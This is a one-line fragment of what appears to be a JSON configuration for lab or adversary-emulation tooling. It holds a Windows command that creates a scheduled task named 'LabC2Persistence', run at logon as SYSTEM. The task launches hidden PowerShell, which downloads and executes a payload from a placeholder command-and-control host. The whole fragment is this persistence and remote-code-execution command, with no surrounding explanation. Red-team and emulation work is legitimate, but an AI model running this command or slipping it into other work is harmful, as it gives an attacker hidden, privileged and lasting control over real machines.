      "cmd": "schtasks /create /tn LabC2Persistence /tr \"powershell -nop -w hidden -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://__C2__/payload')\\\"\" /sc onlogon /ru SYSTEM /f 2>&1; schtasks /query /tn LabC2Persistence",
